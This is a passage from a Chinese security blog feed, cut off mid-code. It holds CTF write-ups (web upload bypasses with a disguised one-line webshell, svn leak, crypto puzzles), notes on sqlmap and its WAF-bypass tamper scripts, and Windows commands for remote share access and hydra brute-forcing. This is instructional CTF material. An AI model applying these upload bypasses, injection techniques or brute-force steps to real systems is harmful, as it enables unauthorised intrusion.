        <content type="html"><![CDATA[<h2 id="web-upload"><a href="#web-upload" class="headerlink" title="web-upload"></a>web-upload</h2><p>页面打开显示下图：<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2688224292.png"></p><p>查看源代码没啥发现。。。<br>burp抓包，发现响应头有flag值的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2740139262.png"></p><p>bese64解码：<img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1608162908.png"></p><p>再次base64解码，得到一组数值，源代码提示将得到的内容POST</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/832980815.png"></p><p>返回新的响应头flag值，写个脚本跑看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9e05cc717ffc4e4da52b8203470cdf6f6fca6fdb7574432a.changame.ichunqiu.com&#x2F;&quot;</span><br><span class="line">url_a &#x3D; requests.session()</span><br><span class="line">a &#x3D; url_a.get(url).headers[&#39;FLAG&#39;]</span><br><span class="line">key_a &#x3D; base64.b64decode(a)</span><br><span class="line">key &#x3D; str(key_a).split(&#39;:&#39;)</span><br><span class="line">key &#x3D; key[1][1:-1]</span><br><span class="line">key &#x3D; base64.b64decode(key)</span><br><span class="line">data &#x3D; &#123;&quot;ichunqiu&quot;:key&#125;</span><br><span class="line">get &#x3D; url_a.post(url,data &#x3D; data)</span><br><span class="line">print(get.text)</span><br></pre></td></tr></table></figure><p>跑出来一个路径</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2436058800.png"></p><p>点击按钮进入</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1717428112.png"></p><p>通过扫描目录发现有/.svn目录提示403<br>svn泄露得到/.svn/wc.db</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1691234355.png"></p><p>md5解码，用得到的md5(8638d5263ab0d3face193725c23ce095)进行登录，密码随便填<br>下面是验证码md5脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import hashlib</span><br><span class="line">import itertools as its</span><br><span class="line">words &#x3D; &quot;1234568790abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">r &#x3D; its.product(words, repeat&#x3D;5)</span><br><span class="line">for i in r:</span><br><span class="line"> a &#x3D; &quot;&quot;.join(i)</span><br><span class="line"> md5 &#x3D; hashlib.md5(a.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line"> if(md5[0:6] &#x3D;&#x3D; &#39;aa2cec&#39;):</span><br><span class="line">  print a</span><br><span class="line">  break</span><br></pre></td></tr></table></figure><p>提示新页面<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2567870452.png"></p><p>文件上传。。。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3602213636.png"></p><p>php、php3、php4、php5、php7、pht、phtml、phps 能被解析的后缀<br>一个个试过去发现pht能被解析<br>burp改包得到flag</p><blockquote><p>参考：<a href="https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/7a999d34.html">https://writeup.ctfhub.com/Skill/Web/信息泄露/7a999d34.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> I春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注入工具</title>
      <link href="2020/03/18/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/"/>
      <url>2020/03/18/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.cnblogs.com/twlr/p/12287293.html#_label0">https://www.cnblogs.com/twlr/p/12287293.html#_label0</a></p></blockquote><blockquote><p>原文：ttps://<a href="http://www.cnblogs.com/twlr/p/12287293.html#_label0">www.cnblogs.com/twlr/p/12287293.html#_label0</a></p></blockquote><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap属于比较经典的一个注入工具，功能强大，还自带一些绕过参数</p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u “url”  对url连接进行注入检测</span><br><span class="line"></span><br><span class="line">然后使用注入参数进行注入</span><br><span class="line"></span><br><span class="line">-u  &#x2F;&#x2F;添加url进行检测</span><br><span class="line"></span><br><span class="line">-dbs  &#x2F;&#x2F;进行数据库检测</span><br><span class="line"></span><br><span class="line">-tables  &#x2F;&#x2F;猜解数据库表</span><br><span class="line"></span><br><span class="line">-colums  &#x2F;&#x2F;猜解字段</span><br><span class="line"></span><br><span class="line">--level 1~5  &#x2F;&#x2F;设置注入等级最高5级</span><br><span class="line"></span><br><span class="line">--risk  1~3  &#x2F;&#x2F;设置危险等级</span><br><span class="line"></span><br><span class="line">--data  “参数内容”   &#x2F;&#x2F;post注入</span><br><span class="line"></span><br><span class="line">-r 1.txt  &#x2F;&#x2F;对1.txt内容进行注入</span><br><span class="line"></span><br><span class="line">--delay  &#x2F;&#x2F;延时</span><br></pre></td></tr></table></figure><p>sqlmap自带绕过脚本temper</p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--temper 脚本名称</span><br></pre></td></tr></table></figure><p>列出一些脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“&#x3D;”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“&#x3D;”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“&#x3D;”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br></pre></td></tr></table></figure><h2 id="啊D"><a href="#啊D" class="headerlink" title="啊D"></a>啊D</h2><p>啊D是一个图形化工具，直接在目标出输入url地址即可进行自动扫描</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2900056067.png"></p><h2 id="明小子"><a href="#明小子" class="headerlink" title="明小子"></a>明小子</h2><p>明小子也是一款图形化工具使用方法和啊D类似</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Web进阶区</title>
      <link href="2020/03/15/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
      <url>2020/03/15/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>第一步：<br>我们先写一个一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2500870734.png"></p><p>然后改为图片格式后缀<br>第二：<br>选择上传文件，先别急着上传，打开 burpsuite,然后抓包改包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1388007942.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3480129909.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1387188277.png"></p><p>后缀改为 php，然后 Go</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/610521991.png"></p><p>就看见上传路径了，最后菜刀链接</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/676928215.png"></p><h2 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h2><p>访问index.phps，发现php源码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2193025587.png"></p><p>审计代码，发现参数id=admin要通过两次url编码，burpsuite可以实现</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3708281185.png"></p><p>最后访问</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/435677933.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客常用的DOS命令</title>
      <link href="2020/03/14/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%9A%84DOS%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/14/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%9A%84DOS%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624376713.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping +网址：查找网址IP</span><br><span class="line">ipconfig &#x2F;all：查看详细信息，如网关，DS....</span><br><span class="line">ipconfig &#x2F;?：功能</span><br><span class="line">ipconfig &#x2F;flushdns：刷新DNS解析缓存</span><br><span class="line">systeminfo较为常见常用，用于查看补丁情况，硬件信息，系统版本，安装时间....</span><br><span class="line">若无补丁，则可使用命令行工具getroot得知可利用的漏洞</span><br><span class="line">arp+-a：查看arp缓存表（现在都是通过动态获取的，不足：通过广播进入到本地的）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2937642202.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown+-a：取消</span><br><span class="line">dir+c:\ :查看C盘 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999985613.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">带dir的都是目录，带数字的都是文件，同时还可看到最后一次修改时间以及文件大小</span><br><span class="line">dir &#x2F;a：查看隐藏信息</span><br><span class="line">cd .. ：返回上级目录(..：表示相对于上一级) </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4004777264.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notepad+aaaa.txt：打开名为aaaa.txt的文本</span><br><span class="line">type+aaaa.txt：在命令行里读取文本信息</span><br><span class="line">del+aaaa.txt：删除</span><br><span class="line">md+名字：创建目录</span><br><span class="line">rd+名字：删除目录</span><br><span class="line">ren+原名.txt   更改名.txt：重命名 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2886487484.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy 1.txt d:\ ：将1.txt文本复制到D盘</span><br><span class="line">telnet ip,然后输入账号密码：远程连接此IP的cmd</span><br><span class="line">telnet还可以探测一些服务器的端口</span><br><span class="line">net use k:\\\ ip \c$：将此IP的C盘拿走作为自己的K盘</span><br></pre></td></tr></table></figure><p>账号密码(局域网)可用命令行工具hydra爆破</p><p>smb(快)：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1748283199.png"></p><p>telnet(慢)：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3191985717.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop：若中间有空格，则需使用“” </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264889898.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1224845363.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -an：查看连接情况（内部地址与外部地址哪个相连，连接状态）</span><br><span class="line">tasklist</span><br><span class="line">taskkill：结束进程 (taskkill -f -im qq.exe)</span><br><span class="line">msg   用户名 信息 ：给该用户发消息</span><br><span class="line">批处理：多组命令放到一个bat文件里面，保持为bat文件逐条执行</span><br><span class="line">批处理文件：DOS命令的组合文件 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Crypto新手区</title>
      <link href="2020/03/01/XCTF-Crypto%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/03/01/XCTF-Crypto%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>先把文件下载下来，然后base64解密一下就出来了，so easy</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2863969933.png"></p><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>在下载的时候顺便看看题目<br>这题目我是看不出有啥提示，纯属瞎扯，对于菜鸡的我只能开始尝试来把它试出来，无果<br>最后还是百度了一下wp知道他是key为12的凯撒密码（emmmm，Caesar==凯撒，不过key=12我也不清楚大佬是怎么看出来的…）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/909570894.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/534878401.png"></p><p>附上地址：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>下载的空闲看看题目</p><p>这还是有点提示的，再看看文档</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4085632403.png"></p><p>好吧，还是百度一下wp<br>原来是摩斯密码，不愧是大佬<br>摩斯密码 1替换成-,0替换成.,直接解密</p><blockquote><p>11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</p><p>– — .-. … . -.-. — -.. . .. … … — .. -. - . .-. . … - .. -. –.</p></blockquote><p>解密得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/459369869.png"></p><p>附上链接：<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>贴出大佬的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;</span><br><span class="line">c&#x3D;c.replace(&quot;1&quot;,&quot;-&quot;)</span><br><span class="line">c&#x3D;c.replace(&quot;0&quot;,&quot;.&quot;)</span><br><span class="line">print (c)</span><br></pre></td></tr></table></figure><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p>边下载边看题</p><p>打开文档一看==八成是base64，于是就开始：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3600678099.png"></p><p>接着就开始各种尝试，结果一无所获，受不了，还是百度wp看看..</p><p>看完恍然大悟，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1545849420.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1086529568.png"></p><p>附上大佬代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#import re</span><br><span class="line">    r&#x3D;&quot;&#x2F;119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100&quot;</span><br><span class="line">r&#x3D;re.split(&quot;&#x2F;&quot;,r)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,len(r)):</span><br><span class="line">flag&#x3D;flag+chr(int(r[i]))</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><p>边下边看</p><p>打开文档一脸懵…<br>幂数加密？？？百度看看这个<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86%E6%B3%95?fr=aladdin"><strong>幂数加密</strong></a><br>看完就可以开始写脚本来运行看看，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/450938320.png"></p><p>附上代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&quot;8842101220480224404014224202480122&quot;</span><br><span class="line">a&#x3D;a.split(&quot;0&quot;)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">str &#x3D; a[i]</span><br><span class="line">list&#x3D;[]</span><br><span class="line">sum&#x3D;0</span><br><span class="line">for j in str:</span><br><span class="line">list.append(j)</span><br><span class="line">length &#x3D; len(list)</span><br><span class="line">for k in range(0,length):</span><br><span class="line">sum+&#x3D;int(list[k])</span><br><span class="line">flag+&#x3D;chr(sum+64)</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>看完这题目，感觉他应该是提示我们是栅栏密码<br>下好附件，打开将内容复制，进行解密<br>但是这里我尝试了好多次并没有得出wp…<br>所以我又去看了看大佬们的wp，原来是因为国内外对栅栏密码的加密原理相同但实际过程有些不同，而这道题就需要用国外的解密方法来解密</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1202160587.png"></p><p>附上：<br>国内解密 <a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a><br>国外解密 <a href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a></p><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>先百度看看<a href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310?fromtitle=RSA&fromid=210678&fr=aladdin"><strong>RSA</strong></a><br>看得有点晕…<br>已知p,q,e，求d<br>RSA计算过程：<br>1.任选两个大质数p和q，p!=q，计算N=pq<br>2.计算N的欧拉函数r(n)=(p-1)(q-1)<br>3.任选一个e满足 1&lt;e&lt;r(n) ,且e与r(n)互质<br>4.找到d，使e*d/r(n)=x……1（x是多少不重要，重要的是余数为1）<br>5.至此（n，e）为公钥，（n，d）为私钥<br>6.加密：C=M^e(mod n)；解密：M=C^d（mod n）<br>最后用欧拉函数算出flag<br>总结：加密==数学</p><blockquote><p>不过后来看得某大佬一种更牛逼的做法，在这分享一下：</p></blockquote><p>小工具地址：<a href="https://www.freebuf.com/articles/others-articles/161475.html">https://www.freebuf.com/articles/others-articles/161475.html</a><br>根据N=p*q解出N的值为2135733555619387051<br>然后使用这个小工具输入命令</p><blockquote><p>python solve.py –verbose –private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491</p></blockquote><p>就得到了d的值<br>是不是很强</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3914656980.png"></p><h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><p>看题目，下附件；打开附件，按题目用摩斯密码解一下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2298439705.png"></p><p>根据解密得到的情报，可能还有什么hhh，后面都是abab的排序，猜测应该是培根加密，于是就用培根解密一下</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1697721415.png"></p><p>加上题目给的提示为小写的，得到最终的flag</p><p>附上培根解密：<a href="https://tool.bugku.com/peigen/">https://tool.bugku.com/peigen/</a></p><h2 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h2><p>下好附件发现是个pyc后缀的文件，没听说过，一脸懵…<br>先百度看看pyc后缀是什么东东</p><blockquote><p>pyc文件就是py程序编译后得到的文件，是一种二进制文件，是一种byte code，py文件变成pyc文件后，运行加载的速度会有所提高，经过python解释器最终会生成机器码运行。所以pyc文件是可以跨平台部署的，类似Java的.class文件。如果py文件改变，也会重新生成pyc文件。</p></blockquote><p>接着在百度时，得知可以通过在线工具进行反编译：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/407271199.png"></p><p>附上链接：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p>在线反编译pyc后得到源代码，根据加密规则解密得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#import base64</span><br><span class="line">final &#x3D; &#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E&#x3D;&#x3D;&#x3D;&#39;</span><br><span class="line">def decode3(ans):</span><br><span class="line">return base64.b32decode(ans)</span><br><span class="line">def decode2(ans):</span><br><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in ans:</span><br><span class="line">x&#x3D;i^36</span><br><span class="line">x&#x3D;x-36</span><br><span class="line">s+&#x3D;chr(x)</span><br><span class="line">return s</span><br><span class="line">def decode1(ans):</span><br><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in ans:</span><br><span class="line">x&#x3D;ord(i)-25</span><br><span class="line">x&#x3D;x^36</span><br><span class="line">s+&#x3D;chr(x)</span><br><span class="line">return s</span><br><span class="line">t1&#x3D;decode3(final)</span><br><span class="line">print(t1)</span><br><span class="line">t2&#x3D;decode2(t1)</span><br><span class="line">print(t2)</span><br><span class="line">print(decode1(t2))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2191619144.png"></p><p>后来看了大佬们的wp发现还有一个反编译的工具<br>原文链接：<a href="https://blog.csdn.net/hippotomons/article/details/102538110">https://blog.csdn.net/hippotomons/article/details/102538110</a></p><h2 id="Normal-RSA"><a href="#Normal-RSA" class="headerlink" title="Normal_RSA"></a>Normal_RSA</h2><p>又是RSA，经过前面的一道RSA后，这次再使用工具尝试一下到底会不会<br>按提示输入对应的命令：</p><blockquote><p>python solve.py –verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem –decrypt examples/jarvis_oj_mediumRSA/flag.enc</p></blockquote><p>最后成功拿到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3748581080.png"></p><p>嘿嘿，还不错</p><h2 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h2><p>先百度看看<a href="https://www.cnblogs.com/block2016/p/5419894.html"><strong>转轮机加密</strong></a></p><blockquote><p>工作原理：<br>转轮密码机由多个转轮构成，每个转轮旋转的速度都不一样，比如有3个转轮，分别标号为1,2,3，其中1号转轮转动26个字母后，2号转轮就转动一个字母，当2号转轮转动26个字母后，3号转轮就转动1个字母。因此，当转轮密码机转动26X26X26次后，所有转轮恢复到初始状态，即3个转轮密码机的一个周期长度为26X26X26（17576）的多表代换密码。</p></blockquote><p>接着打开文件，按他给出的进行排序：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4263613619.png"></p><p>为了看得更加方便，逐个将其写出来，最后试出来flag(注意是小写的)：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2458369657.png"></p><p>附上官方wp的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#import re</span><br><span class="line">sss&#x3D;&#39;&#39;&#39;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; 